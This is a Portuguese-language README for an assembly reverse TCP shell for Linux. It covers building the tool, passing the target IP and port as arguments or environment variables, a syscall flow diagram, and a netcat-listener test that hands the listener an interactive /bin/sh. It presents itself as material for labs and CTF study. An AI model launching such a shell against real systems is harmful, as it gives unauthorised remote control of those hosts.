# 🐚 microshell

Shell reverso TCP escrito em Assembly x86_64 puro para Linux.  
Extremamente leve, sem dependências externas, usando syscalls diretas do kernel.

## O que ele faz

Conecta em um IP e porta definidos, redireciona stdin/stdout/stderr, e executa `/bin/sh`.

Ideal para:

- Estudos de engenharia reversa
- Testes de penetração controlados (CTFs, labs)

## ⚙️ Build

```bash
make
```

Requer:

- nasm
- ld (binutils)

## Configuração Dinâmica

O microshell agora suporta configuração dinâmica de conexão:

```bash
# Uso com argumentos
./microshell 192.168.1.100 4444

# Uso com variáveis de ambiente
export REMOTE_IP=192.168.1.100
export REMOTE_PORT=4444
./microshell
```

Sem argumentos ou variáveis, o padrão é `127.0.0.1:4444`.

## 📊 Comparativo de Tamanho

| Implementação | Tamanho | Comparação |
|---------------|---------|------------|
| microshell (Assembly) | 1.2 KB | 1x (referência) |
| C (gcc sem otimização) | ~16 KB | ~13x maior |
| C (gcc -Os) | ~8 KB | ~6.7x maior |
| Python (script) | ~128 bytes | Menor, mas requer interpretador (~10 MB) |
| Go | ~2 MB | ~1,666x maior |
| Rust | ~176 KB | ~146x maior |

*Tamanhos aproximados após compilação/build em x86_64 Linux*

## 🔄 Fluxo de Execução

```
┌──────────────────┐      ┌──────────────────┐      ┌──────────────────┐
│                  │      │                  │      │                  │
│ 1. Criar Socket  │──────▶ 2. Conectar ao   │──────▶ 3. Duplicar      │
│    (syscall 41)  │      │    IP/Porta      │      │    Descritores   │
│                  │      │    (syscall 42)  │      │    (syscall 33)  │
└──────────────────┘      └──────────────────┘      └──────────────────┘
                                                              │
                                                              │
                                                              ▼
┌──────────────────┐                             ┌──────────────────┐
│                  │                             │                  │
│ 5. Esperar       │◀────────────────────────────│ 4. Executar      │
│    comandos      │                             │    /bin/sh       │
│    (loop)        │                             │    (syscall 59)  │
└──────────────────┘                             └──────────────────┘
```

### Detalhes de Implementação

O microshell suporta configuração em três camadas de prioridade:

1. **Argumentos da linha de comando** (maior prioridade)
2. **Variáveis de ambiente** (segunda prioridade) 
3. **Valores padrão** (fallback)

A implementação inclui:
- Função `parse_ip`: Converte string IP (formato a.b.c.d) para o formato binário
- Função `atoi`: Converte string numérica para inteiro
- Função `getenv`: Busca valores de variáveis de ambiente

## Teste

Em um terminal, rode:

```bash
nc -lvnp 4444
```

Em outro:

```bash
./microshell
```

Você receberá uma shell remota interativa

## ⚠️ Disclaimer

Uso exclusivo para fins educacionais e laboratoriais.
Não utilize esse código para atividades não autorizadas.

## Autor

Desenvolvido por [Arthur Mairink](https://github.com/mairinkdev).

## 📁 Estrutura do repositório

```
microshell/
├── microshell.asm     ✅ Código do shell reverso
├── Makefile           🛠️ Para build simples
├── diagram.txt        📝 Diagrama ASCII do fluxo
└── README.md          📘 Documentação pro GitHub
```
